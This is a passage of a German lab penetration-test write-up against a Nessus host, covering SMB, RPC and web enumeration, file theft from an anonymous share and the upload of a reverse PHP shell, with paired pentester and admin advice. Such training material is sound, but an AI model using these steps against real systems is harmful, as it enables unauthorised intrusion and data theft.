+                <strong>Analyse:</strong> Ich versuche erneut, die Shares auf dem Zielsystem &uuml;ber SMB anonym aufzulisten (<code>smbclient -L //192.168.2.65 -N</code>). &Uuml;berraschenderweise listet diese Ausf&uuml;hrung diesmal mehrere Shares auf: <span class="command">ADMIN$, C$, Documents, IPC$</span>. Die vorherige enum4linux-Ausgabe und ein smbclient-Versuch zeigten keinen Share-Zugriff. Dies k&ouml;nnte an Timing liegen, am Zustand des Dienstes oder an leichten Unterschieden in den smbclient-Versionen oder Parametern &uuml;ber die Zeit. Wichtig ist: Ich sehe nun die Shares, insbesondere die <span class="command">Documents</span>-Freigabe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der anonyme Zugriff auf die Shares ist m&ouml;glich. Die <span class="command">Documents</span>-Freigabe ist sehr interessant, da sie oft Benutzerdateien enth&auml;lt. Dies &ouml;ffnet einen Weg, um potenziell sensible Dokumente zu finden, die Anmeldedaten oder andere Hinweise enthalten k&ouml;nnten. ADMIN$ und C$ sind Standard-Admin-Shares, die f&uuml;r anonyme Benutzer normalerweise nicht zug&auml;nglich sein sollten, aber ihre Auflistung allein ist schon ein kleiner Informationsgewinn.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn die anf&auml;ngliche SMB-Enumeration fehlschl&auml;gt, versuche es sp&auml;ter erneut oder mit leicht ver&auml;nderten Parametern. Nutze anonyme SMB-Zugriffe, um Shares zu durchsuchen und Dateien herunterzuladen. Suche nach Anmeldedaten in Dokumenten, Konfigurationsdateien oder Skripten auf den Shares.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere anonymen Zugriff auf alle SMB-Shares. Setze strikte Berechtigungen auf Shares, sodass nur autorisierte Benutzer darauf zugreifen k&ouml;nnen. Überwache SMB-Zugriffe, insbesondere anonyme oder von unbekannten IPs.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">smbclient -L //192.168.2.65 -N</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Anonymous login successful</span>
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">ADMIN$</span>          <span class="command">Disk</span>      <span class="command">Remote Admin</span>
+	<span class="command">C$</span>              <span class="command">Disk</span>      <span class="command">Default share</span>
+	<span class="command">Documents</span>       <span class="command">Disk</span>      
+	<span class="command">IPC$</span>            <span class="command">IPC</span>       <span class="command">Remote IPC</span>
+Reconnecting with SMB1 for workgroup listing.
+do_connect: <span class="password">Connection to 192.168.2.65 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>
+Unable to connect with SMB1 -- no workgroup available
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe spezifische Nmap-Skripte f&uuml;r SMB-Schwachstellen auf Port 445 aus (<code>nmap -p 445 --script=smb-vuln* -Pn 192.168.2.65</code>). Dies pr&uuml;ft auf bekannte Schwachstellen wie MS10-061 (Print Spooler) und MS10-054 (Srv2.sys). Die Ausgabe zeigt, dass beide Skripte fehlschlagen oder negativ sind: <span class="password">_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span> und <span class="password">_smb-vuln-ms10-054: false</span>. Dies bedeutet, dass diese spezifischen, älteren SMB-Schwachstellen auf diesem System nicht ausnutzbar sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl ich anonymen Zugriff auf die Shares habe, scheinen einige bekannte, &auml;ltere SMB-Schwachstellen gepatcht zu sein. Dies ist zu erwarten auf einem Windows Server 2022 System (wie von Nmap OS Detection gesch&auml;tzt). Der Fokus bleibt auf dem anonymen Share-Zugriff und der Nessus-Oberfläche.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze spezifische Schwachstellen-Skripte, um Zeit zu sparen, aber verlasse dich nicht ausschlie&szlig;lich darauf. Manuelle Prüfungen und die Ausnutzung anderer Vektoren sind oft notwendiger.
+                <br><strong>Empfehlung (Admin):</strong> Halte das System mit Windows Updates aktuell, um bekannte SMB-Schwachstellen zu beheben.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nmap -p 445 --script=smb-vuln* -Pn 192.168.2.65</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 22:56 CEST
+Nmap scan report for <span class="command">nessus.hmv (192.168.2.65)</span>
+Host is up (<span class="command">0.00019s latency</span>).
+
+PORT    STATE SERVICE
+<span class="command">445/tcp</span> <span class="password">open</span>  <span class="command">microsoft-ds</span>
+MAC Address: <span class="command">08:00:27:E0-80-47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+Host script results:
+|_<span class="password">smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span>
+|_<span class="password">smb-vuln-ms10-054: false</span>
+
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche einen anonymen RPC-Client-Login (<code>rpcclient -U "" -N 192.168.2.65</code>). RPCClient kann verwendet werden, um Informationen über SMB/RPC abzufragen, wenn anonyme Zugriffe m&ouml;glich sind. Der Befehl schlägt mit <span class="password">Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED</span> fehl. Dies best&auml;tigt erneut, dass die anonymen Rechte &uuml;ber SMB/RPC stark eingeschränkt sind und keine detaillierte RPC-Enumeration m&ouml;glich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der fehlende anonyme RPC-Zugriff ist konsistent mit den enum4linux-Ergebnissen und best&auml;tigt, dass ich keine weiteren Benutzer-, Gruppen- oder Dienstinformationen über diesen Vektor erhalten kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn anonyme RPC-Zugriffe eingeschränkt sind, konzentriere dich auf andere Vektoren, es sei denn, du findest Anmeldedaten.
+                <br><strong>Empfehlung (Admin):</strong> Beschr&auml;nke anonymen Zugriff auf RPC-Endpunkte.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">rpcclient -U &quot;&quot; -N 192.168.2.65</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich greife &uuml;ber HTTPS auf die Nessus-Oberfläche zu (<code>curl -k https://192.168.2.65:8834</code>). Ich verwende die Option <code>-k</code>, um Zertifikatsfehler zu ignorieren, und <code>-s</code> f&uuml;r den Silent-Modus, um nur den Body der Antwort zu erhalten. Die Ausgabe zeigt den HTML-Quellcode der Anmeldeseite oder einer Landing Page, der JavaScript-Dateien wie <span class="command">nessus6.js</span> und <span class="command">pendo-client.js</span> sowie CSS-Dateien verkn&uuml;pft. Es gibt auch einen Verweis auf <span class="command">/unsupported6.html</span> f&uuml;r &auml;ltere IE-Versionen und einen Kommentar <span class="command">Resource-Script</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Abrufen des HTML-Quellcodes erm&ouml;glicht die Analyse der Struktur der Nessus-Weboberfläche und die Identifizierung relevanter Ressourcen (JS, CSS), die weitere Informationen &uuml;ber die Anwendung oder API-Endpunkte enthalten k&ouml;nnten. Das Vorhandensein von JavaScript deutet auf eine dynamische Oberfläche hin, die &uuml;ber API-Aufrufe funktioniert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere den Quellcode von Webanwendungen, um Endpunkte, Parameter, API-Aufrufe und JavaScript-Logik zu verstehen. Suche nach Hinweisen auf API-Strukturen, Anmeldeverfahren oder unsichere client-seitige Implementierungen.
+                <br><strong>Empfehlung (Admin):</strong> Achte darauf, dass Webanwendungen keine unn&ouml;tigen Informationen im Quellcode preisgeben, insbesondere keine Hinweise auf interne API-Endpunkte oder Implementierungsdetails.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">curl -s -k https://192.168.2.65:8834</span>                    
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">Nessus</span>
+        &lt; --[if lt IE 11]&gt;
+         
+                window.location = &#x27;/unsupported6.html&#x27;;
+        
+        &lt; ![endif]--&gt;
+        &lt; scrpt src=&quot;<span class="command">nessus6.js?v=1715293282346</span>&quot;&gt;&lt; scrpt &gt;
+        &lt; scrpt src=&quot;<span class="command">pendo-client.js</span>&quot;&gt;&lt; scrpt &gt;
+        &lt; --<span class="command">Resource-Script</span>--&gt;
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich untersuche die Nessus-Weboberfläche weiter, insbesondere auf API-Endpunkte. Basierend auf der Struktur von Webanwendungen und den JS-Dateien, die auf API-Interaktionen hindeuten, teste ich einen Pfad wie <code>/server/properties</code>, der oft allgemeine Informationen &uuml;ber den Server preisgibt. Ich verwende <code>curl -k https://192.168.2.65:8834/server/properties</code>, um diese URL &uuml;ber HTTPS mit ignorierten Zertifikatsfehlern abzurufen. Die Ausgabe ist ein JSON-Objekt mit Server-Eigenschaften: <span class="command">{&quot;md5sum_wizard_templates&quot;:&quot;...&quot;,&quot;nessus_type&quot;:&quot;Nessus Essentials&quot;,&quot;ui_theme&quot;:&quot;track_os_setting&quot;,&quot;md5sum_tenable_links&quot;:&quot;...&quot;}</span>. Dieses JSON enth&auml;lt die <span class="command">nessus_type</span> (Nessus Essentials), aber keine offensichtlichen Anmeldedaten oder sensiblen Konfigurationsdetails.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden und Auslesen von API-Endpunkten ist ein wichtiger Schritt bei der Web-Enumeration, insbesondere bei modernen Webanwendungen. Der <code>/server/properties</code> Endpunkt gab zwar keine direkten Anmeldedaten preis, best&auml;tigte aber die Nessus-Version (implizit durch &quot;Nessus Essentials&quot; und den Aufbau der Oberfläche) und die API-Struktur. Ich muss nach weiteren API-Endpunkten suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach bekannten oder vermuteten API-Endpunkten auf Webanwendungen, insbesondere auf Management-Oberflächen oder Diensten. Analysiere API-Antworten auf sensible Daten oder Schwachstellen. Nutze Tools wie feroxbuster oder ffuf mit angepassten Wortlisten f&uuml;r API-Endpunkte.
+                <br><strong>Empfehlung (Admin):</strong> Schütze API-Endpunkte streng, insbesondere solche, die Informationen &uuml;ber die Systemkonfiguration preisgeben k&ouml;nnen. Implementiere Authentifizierung und Autorisierung f&uuml;r alle API-Zugriffe.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">curl -k https://192.168.2.65:8834/server/properties</span>                    
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">{&quot;md5sum_wizard_templates&quot;:&quot;11939be86ca24a4dbbe8f9b85f95e140&quot;,&quot;nessus_type&quot;:&quot;Nessus Essentials&quot;,
+&quot;ui_theme&quot;:&quot;track_os_setting&quot;,&quot;md5sum_tenable_links&quot;:&quot;d41d8cd98f00b204e9800998ecf8427e&quot;}</span>  
+</pre></div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich kann anonym auf die SMB-Freigabe <span class="command">//192.168.2.65/Documents</span> zugreifen. Ich verbinde mich mit <code>smbclient //192.168.2.65/Documents -N</code> und liste die Dateien auf (<code>ls</code>). Die Ausgabe zeigt mehrere Dateien und Verzeichnisse, darunter <span class="command">desktop.ini</span> und zwei PDF-Dateien: <span class="command">My Basic Network Scan_hwhm7q.pdf</span> und <span class="command">Web Application Tests_f6jg9t.pdf</span>. Ich lade diese drei Dateien mit dem <code>get</code> Befehl herunter: <code>get desktop.ini</code>, <code>get &quot;My Basic Network Scan_hwhm7q.pdf&quot;</code> und <code>get &quot;Web Application Tests_f6jg9t.pdf&quot;</code>. Die Anführungszeichen sind bei Dateinamen mit Leerzeichen notwendig. Ich versuche auch, in das Verzeichnis <span class="command">My Videos</span> zu wechseln (<code>cd &quot;My Videos&quot;</code>), was jedoch mit <span class="password">NT_STATUS_ACCESS_DENIED</span> fehlschlägt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme Zugriff auf die <span class="command">Documents</span>-Freigabe und das Herunterladen der Dateien (desktop.ini, PDFs) sind ein erfolgreicher Initial Access. Der Zugriff auf andere Verzeichnisse ist eingeschränkt, aber die Dokumente selbst k&ouml;nnen sehr wertvolle Informationen enthalten (Benutzernamen, Passw&ouml;rter, Systemdetails etc.). Die Untersuchung dieser Dokumente ist nun eine hohe Priorit&auml;t.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze erfolgreiche Share-Zugriffe, um alle potenziell interessanten Dateien herunterzuladen. Analysiere Dokumente, Textdateien und Konfigurationsdateien gr&uuml;ndlich auf sensible Informationen.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere anonymen Zugriff auf SMB-Shares. Setze restriktive Berechtigungen auf Shares, sodass nur autorisierte Benutzer die notwendigen Verzeichnisse lesen/schreiben k&ouml;nnen. Vermeide das Speichern sensibler Daten in freigegebenen Ordnern, insbesondere wenn diese anonym zug&auml;nglich sind.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">smbclient //192.168.2.65/Documents -N</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Anonymous login successful</span>
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">ADMIN$</span>          <span class="command">Disk</span>      <span class="command">Remote Admin</span>
+	<span class="command">C$</span>              <span class="command">Disk</span>      <span class="command">Default share</span>
+	<span class="command">Documents</span>       <span class="command">Disk</span>      
+	<span class="command">IPC$</span>            <span class="command">IPC</span>       <span class="command">Remote IPC</span>
+Reconnecting with SMB1 for workgroup listing.
+do_connect: <span class="password">Connection to 192.168.2.65 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>
+Unable to connect with SMB1 -- no workgroup available
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">smbclient //192.168.2.65/Documents -N</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="command">smb: \> ls</span>
+<span class="command">  .                                  DR        0  Sat Oct 19 02:42:53 2024</span>
+<span class="command">  ..                                  D        0  Sat Oct 19 07:08:23 2024</span>
+<span class="command">  desktop.ini                       AHS      402  Sat Jun 15 19:54:33 2024</span>
+<span class="command">  My Basic Network Scan_hwhm7q.pdf      A   122006  Sat Oct 19 00:19:59 2024</span>
+<span class="command">  My Music                        DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Pictures                     DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Videos                       DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  Web Application Tests_f6jg9t.pdf      A   136025  Sat Oct 19 00:20:14 2024</span>
+
+<span class="command">		12942591 blocks of size 4096. 10720849 blocks available</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+smb: \> <span class="command">get desktop.ini</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">getting file \desktop.ini of size 402 as desktop.ini (9,6 KiloBytes/sec) (average 9,6 KiloBytes/sec)</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+smb: \> <span class="command">get &quot;My Basic Network Scan_hwhm7q.pdf&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">getting file \My Basic Network Scan_hwhm7q.pdf of size 122006 as My Basic Network Scan_hwhm7q.pdf (7943,0 KiloBytes/sec) (average 2134,6 KiloBytes/sec)</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+smb: \> <span class="command">get &quot;Web Application Tests_f6jg9t.pdf&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">getting file \Web Application Tests_f6jg9t.pdf of size 136025 as Web Application Tests_f6jg9t.pdf (11069,7 KiloBytes/sec) (average 3711,4 KiloBytes/sec)</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+smb: \> <span class="command">cd &quot;My Videos&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">cd \My Videos\:</span> <span class="password">NT_STATUS_ACCESS_DENIED</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich teste, ob ich Dateien in die anonym zugängliche SMB-Freigabe hochladen kann. Ich kopiere eine Reverse PHP Shell (`rev.php`, wahrscheinlich aus meinen Standard-Tools) in mein aktuelles Arbeitsverzeichnis (`cp ~/rev.php .`). Dann verbinde ich mich erneut mit <code>smbclient //192.168.2.65/Documents -N</code> und nutze den <code>put rev.php</code> Befehl, um die Datei hochzuladen. Der anschließende <code>ls</code> Befehl best&auml;tigt, dass die Datei <span class="command">rev.php</span> (31 Bytes) erfolgreich in der Freigabe liegt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Nicht nur das Lesen, sondern auch das Schreiben in die anonyme SMB-Freigabe ist m&ouml;glich. Dies ist eine kritische Schwachstelle. Die F&auml;higkeit, beliebige Dateien (einschlie&szlig;lich potentieller Webshells oder anderer Payloads) hochzuladen, kombiniert mit der Lese-LFI-Schwachstelle, &ouml;ffnet weitreichende M&ouml;glichkeiten. Allerdings ist nicht klar, ob das Web-Root-Verzeichnis mit dieser Freigabe identisch ist oder ob eine der LFI-lesbaren Dateien ein Upload-Ziel f&uuml;r eine Webshell &uuml;ber LFI sein k&ouml;nnte. Vorerst habe ich einen Dateiupload-Vektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Schreiben auf eine anonyme Freigabe m&ouml;glich ist, lade Payloads, Tools oder Webshells hoch. Untersuche, ob die Freigabe vom Webserver bereitgestellt wird oder ob du hochgeladene Dateien &uuml;ber die LFI-Schwachstelle erreichen und ausführen kannst.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Schreibzugriff f&uuml;r anonyme Benutzer auf SMB-Shares. Implementiere strikte Berechtigungen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">cp ~/rev.php .</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">smbclient //192.168.2.65/Documents -N</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="command">smb: \> put rev.php</span> 
+<span class="command">putting file rev.php as \rev.php (0,1 kb/s) (average 0,1 kb/s)</span>
+<span class="command">smb: \> ls</span>
+<span class="command">  .                                  DR        0  Fri Jun 27 23:16:53 2025</span>
+<span class="command">  ..                                  D        0  Sat Oct 19 07:08:23 2024</span>
+<span class="command">  crackmich.scf                       A       53  Fri Jun 27 23:45:12 2025</span>
+<span class="command">  desktop.ini                       AHS      402  Sat Jun 15 19:54:33 2024</span>
+<span class="command">  My Basic Network Scan_hwhm7q.pdf      A   122006  Sat Oct 19 00:19:59 2024</span>
+<span class="command">  My Music                        DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Pictures                     DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Videos                       DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  rev.php                             A       31  Fri Jun 27 23:16:53 2025</span>
+<span class="command">  Web Application Tests_f6jg9t.pdf      A   136025  Sat Oct 19 00:20:14 2024</span>
+
+<span class="command">		12942591 blocks of size 4096. 10714879 blocks available</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich f&uuml;hre einen weiteren Fuzzing-Scan mit feroxbuster durch, diesmal gezielt gegen die Nessus-Oberfläche auf Port 8834 (HTTPS) mit der Option <code>-k</code>, um Zertifikatsfehler zu ignorieren. Ich verwende eine Standard-Web-Content-Wortliste und verschiedene Erweiterungen. Die URL enth&auml;lt <code>/#/</code>, was auf eine Single-Page Application hindeutet, bei der die Pfade nach dem Hash-Symbol vom Client-seitigen JavaScript verarbeitet werden. Die Ausgabe zeigt viele Statuscodes (404, 405, 401, 403, 200) f&uuml;r verschiedene Pfade wie <span class="command">/images</span>, <span class="command">/tenable_links.css</span>, <span class="command">/wizard_templates.css</span>, <span class="command">/nessus6.css</span>, <span class="command">/nessus6.js</span>, <span class="command">/api</span>, <span class="command">/session</span> etc. Besonders interessant sind Pfade wie <span class="command">/session</span> (oft f&uuml;r Login/Logout), <span class="command">/users</span>, <span class="command">/policies</span>, <span class="command">/scanners</span>, <span class="command">/settings</span> und <span class="command">/api</span>, die auf die API-Struktur hindeuten. Die Statuscodes 401 (Unauthorized) und 403 (Forbidden) f&uuml;r einige dieser Pfade sind zu erwarten, da ich nicht angemeldet bin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan war sehr erfolgreich bei der Entdeckung von API-Endpunkten und relevanten Dateien auf der Nessus-Oberfläche. Die Pfade wie `/session` und `/api` sind entscheidend f&uuml;r die Interaktion mit der Nessus-API, die potenziell zur Authentifizierung oder zur Ausnutzung von Schwachstellen genutzt werden k&ouml;nnen. Die hohe Anzahl an gefundenen Endpunkten rechtfertigt weitere Untersuchung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die gefundenen Endpunkte, insbesondere solche, die auf API-Funktionalit&auml;t hindeuten (/api, /session, /users etc.). Versuche, die Funktionsweise der API zu verstehen. Konzentriere dich auf die Authentifizierungsendpunkte.
+                <br><strong>Empfehlung (Admin):</strong> Schütze Nessus-API-Endpunkte streng. Überwache Zugriffe auf API-Pfade auf ungew&ouml;hnliche Muster (z.B. Brute-Force auf /session).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">feroxbuster --url &quot;https://192.168.2.65:8834/#/&quot; --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -k</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+<span class="command"> ___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0</span>
+<span class="command">───────────────────────────┬──────────────────────</span>
+<span class="command"> 🎯  Target Url            │ https://192.168.2.65:8834/#/</span>
+<span class="command"> 🚀  Threads               │ 50</span>
+<span class="command"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command"> 👌  Status Codes          │ All Status Codes!</span>
+<span class="command"> 💥  Timeout (secs)        │ 7</span>
+<span class="command"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
+<span class="command"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+<span class="command"> 🔎  Extract Links         │ true</span>
+<span class="command"> 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+<span class="command"> 🏁  HTTP methods          │ [GET]</span>
+<span class="command"> 🔓  Insecure              │ true</span>
+<span class="command"> 🔃  Recursion Depth       │ 4</span>
+<span class="command">───────────────────────────┴──────────────────────</span>
+<span class="command"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="command">──────────────────────────────────────────────────</span>
+<span class="password">404</span>      <span class="command">GET        1l        6w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/images</span>
+<span class="password">200</span>      <span class="command">GET        0l        0w        0c https://192.168.2.65:8834/tenable_links.css</span>
+<span class="password">200</span>      <span class="command">GET      209l      260w   275506c https://192.168.2.65:8834/wizard_templates.css</span>
+<span class="password">200</span>      <span class="command">GET       97l     6068w   765581c https://192.168.2.65:8834/nessus6.css</span>
+<span class="password">200</span>      <span class="command">GET       66l     7409w   469589c https://192.168.2.65:8834/pendo-client.js</span>
+<span class="password">200</span>      <span class="command">GET      113l    63386w  3618066c https://192.168.2.65:8834/nessus6.js</span>
+<span class="password">200</span>      <span class="command">GET       23l       76w     1217c https://192.168.2.65:8834/</span>
+<span class="password">401</span>      <span class="command">GET        1l        9w       55c https://192.168.2.65:8834/events</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/tools</span>
+<span class="password">403</span>      <span class="command">GET        1l        3w       31c https://192.168.2.65:8834/users</span>
+<span class="password">200</span>      <span class="command">GET      133l      293w    21074c https://192.168.2.65:8834/welcome.html</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/reports</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/registration</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/node</span>
+<span class="password">200</span>      <span class="command">GET       23l       76w     1217c https://192.168.2.65:8834/flash.html</span>
+<span class="password">401</span>      <span class="command">GET        1l        9w       55c https://192.168.2.65:8834/policies</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/plugins</span>
+<span class="password">403</span>      <span class="command">GET        1l        3w       31c https://192.168.2.65:8834/groups</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/server</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/file</span>
+<span class="password">200</span>      <span class="command">GET        1l      306w    19001c https://192.168.2.65:8834/nessus6-api.css</span>
+<span class="password">200</span>      <span class="command">GET       10l     5051w   312239c https://192.168.2.65:8834/nessus6-api.js</span>
+<span class="password">200</span>      <span class="command">GET       14l       36w      491c https://192.168.2.65:8834/api</span>
+<span class="password">401</span>      <span class="command">GET        1l        9w       55c https://192.168.2.65:8834/scanners</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/settings</span>
+<span class="password">200</span>      <span class="command">GET      133l      293w    21074c https://192.168.2.65:8834/Welcome.html</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/remote</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/editor</span>
+<span class="password">401</span>      <span class="command">GET        1l        9w       55c https://192.168.2.65:8834/migration</span>
+<span class="password">405</span>      <span class="command">GET        1l        9w       61c https://192.168.2.65:8834/permissions</span>
+[<span class="command">&gt;-------------------</span>] <span class="command">- 8m    259320/12351136 6h      found:31      errors:1</span>      
+<span class="password">🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_192_168_2_65:8834_#_-1751059108.state ...</span>
+[<span class="command">&gt;-------------------</span>] <span class="command">- 8m    259327/12351136 6h      found:31      errors:1</span>      
+[<span class="command">&gt;-------------------</span>] <span class="command">- 8m    129612/6175344 271/s   https://192.168.2.65:8834/#/</span> 
+[<span class="command">&gt;-------------------</span>] <span class="command">- 8m    128100/6175344 268/s   https://192.168.2.65:8834/</span>  
+</pre></div>
+            </div>
+            <p class="analysis">
